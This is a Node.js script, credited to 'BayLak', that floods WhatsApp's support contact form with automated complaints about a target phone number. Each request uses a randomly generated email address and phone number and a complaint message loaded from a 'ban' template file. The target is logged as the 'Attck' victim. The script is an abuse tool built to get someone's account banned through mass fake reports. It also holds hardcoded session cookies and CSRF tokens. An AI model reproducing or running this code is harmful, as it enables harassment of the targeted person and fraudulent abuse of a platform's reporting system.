const axios = require('axios');
const readline = require('readline');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

console.log("Created by **>>BayLak<<** 2025/01/22");

function isValidCountryCode(phoneNumber) {
    const pattern = /^\+\d{1,4}\d{10,12}$/;  // Modified to allow 10 to 12 digits
    return pattern.test(phoneNumber);
}

let replacementNumber = '';

rl.question('Enter the phone number with country code (e.g. +20123456789): ', (userInput) => {
    if (isValidCountryCode(userInput)) {
        replacementNumber = userInput;
        console.log(`The entered number is valid: ${replacementNumber}`);

        rl.question('Do you want to?? (ban/unban): ', (choice) => {
            choice = choice.trim().toLowerCase();

            if (choice === 'ban') {
                const ban = JSON.parse(fs.readFileSync(path.join(__dirname, 'message_ban_whatsapp.json'), 'utf-8'));
                console.log("The number has been confirmed successfully.");
            } else if (choice === 'unban') {
                const ban = JSON.parse(fs.readFileSync(path.join(__dirname, 'message_unban_whatsapp.json'), 'utf-8'));
                console.log("The number has been confirmed successfully.");
            } else {
                console.log("Invalid choice, please choose 'ban' or 'unban'.");
            }
            rl.close();
        });
    } else {
        console.log("Please enter a valid number with a country code, like: +20123456789");
        rl.close();
    }
});

function getRequestCount() {
    return new Promise((resolve) => {
        rl.question('Enter the number of requests to send: ', (numRequests) => {
            const num = parseInt(numRequests);
            if (num > 0) {
                resolve(num);
            } else {
                console.log("Please enter a number greater than 0.");
                resolve(getRequestCount());
            }
        });
    });
}

getRequestCount().then((numRequests) => {
    const url = "https://www.whatsapp.com/contact/noclient/async/new/";

    const headers = {
        "Host": "www.whatsapp.com",
        "Cookie": "wa_lang_pref=ar; wa_ul=f01bc326-4a06-4e08-82d9-00b74ae8e830; wa_csrf=HVi-YVV_BloLmh-WHL8Ufz",
        "Sec-Ch-Ua-Platform": '"Linux"',
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Ch-Ua": '"Chromium";v="131", "Not_A Brand";v="24"',
        "Sec-Ch-Ua-Mobile": "?0",
        "X-Asbd-Id": "129477",
        "X-Fb-Lsd": "AVpbkNjZYpw",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
        "Origin": "https://www.whatsapp.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.whatsapp.com/contact/noclient?",
        "Accept-Encoding": "gzip, deflate, br"
    };

    const data = {
        "country_selector": "",
        "email": "",
        "email_confirm": "",
        "phone_number": "",
        "platform": "",
        "your_message": "",
        "step": "articles",
        "__user": "0",
        "__a": "",
        "__req": "",
        "__hs": "20110.BP%3Awhatsapp_www_pkg.2.0.0.0.0",
        "dpr": "1",
        "__ccg": "UNKNOWN",
        "__rev": "",
        "__s": "ugvlz3%3A6skj2s%3A4yux6k",
        "__hsi": "",
        "__dyn": "7xeUmwkHg7ebwKBAg5S1Dxu13wqovzEdEc8uxa1twYwJw4BwUx60Vo1upE4W0OE3nwaq0yE1VohwnU14E9k2C0iK0D82Ixe0EUjwdq1iwmE2ewnE2Lw5XwSyES0gq0Lo6-1Fw4mwr81UU7u1rwGwbu",
        "__csr": "",
        "lsd": "AVpbkNjZYpw",
        "jazoest": ""
    };

    function generateRandomEmail() {
        const length = 10;  // Length of the random name part
        const randomName = Math.random().toString(36).substring(2, length + 2);
        return `${randomName}@gmail.com`;
    }

    function generateRandomPhone(countrySelector) {
        if (countrySelector === "EG") {
            return `+20${Math.floor(Math.random() * 3) + 1}${Math.floor(Math.random() * 900000000) + 100000000}`;
        } else if (countrySelector === "US") {
            return `+1${Math.floor(Math.random() * 9000000000) + 1000000000}`;
        } else if (countrySelector === "KR") {
            return `+82${Math.floor(Math.random() * 900000000) + 100000000}`;
        } else if (countrySelector === "CN") {
            return `+86${Math.floor(Math.random() * 900000000) + 100000000}`;
        } else if (countrySelector === "IN") {
            return `+91${Math.floor(Math.random() * 9000000000) + 1000000000}`;
        }
        return "0123456789";
    }

    function saveResponseToLog(responseText) {
        fs.appendFileSync("logs.txt", responseText + "\n");
    }

    async function sendRequests(numRequests, delay) {
        const phone = fs.readFileSync("phones.db", 'utf-8').split('\n');
        const ip = fs.readFileSync("ips.db", 'utf-8').split('\n');

        const countries = ["EG", "US", "KR", "CN", "IN"];  // List of countries to choose from
        const ban = JSON.parse(fs.readFileSync(path.join(__dirname, 'message_ban_whatsapp.json'), 'utf-8'));
        for (const item of ban) {
            item.message = item.message.replace("[###]", replacementNumber);
        }

        for (let i = 0; i < numRequests; i++) {
            try {
                const randomNamePhones = phone[Math.floor(Math.random() * phone.length)].trim();
                const randomIp = ip[Math.floor(Math.random() * ip.length)].trim();
                const randomItem = ban[Math.floor(Math.random() * ban.length)];
                const countrySelector = countries[Math.floor(Math.random() * countries.length)];
                const platforms = ["ANDROID", "IPHONE", "WHATS_APP_WEB_DESKTOP", "KAIOS", "OTHER"];
                const jazoest = `20000${Math.floor(Math.random() * 90000) + 10000}`;
                const __hsi = Math.floor(Math.random() * 9000000000000000000) + 1000000000000000000;
                const __req = Math.random().toFixed(6);
                const __a = Math.floor(Math.random() * 1000000000) + 1;
                const __rev = Math.floor(Math.random() * 9000000000) + 1000000000;

                data.country_selector = countrySelector;
                data.email = generateRandomEmail();
                data.email_confirm = data.email;  // Ensure email_confirm is the same as email
                data.phone_number = generateRandomPhone(countrySelector);  // Generate phone number based on country
                data.your_message = randomItem.subject + "%A0" + randomItem.message;
                data.platform = platforms[Math.floor(Math.random() * platforms.length)];
                data.jazoest = jazoest;
                data.__hsi = __hsi;
                data.__req = __req;
                data.__a = __a;
                data.__rev = __rev;

                const response = await axios.post(url, data, { headers });

                if (response.status === 200) {
                    console.log(`request:(${i + 1}) device?:${randomNamePhones} IP:${randomIp} -> Email:${data.email} | Phone:${countrySelector} ${data.phone_number} | Attck -> ${replacementNumber}`);
                    saveResponseToLog(response.data);
                } else {
                    console.log(`${randomIp} ${i + 1} - Request failed with status code: ${response.status}`);
                }
                await new Promise(resolve => setTimeout(resolve, delay));
            } catch (error) {
                console.log(`${randomNamePhones} ${i + 1} - An error occurred: ${error.message}`);
            }
        }
    }

    sendRequests(numRequests, 10);
});
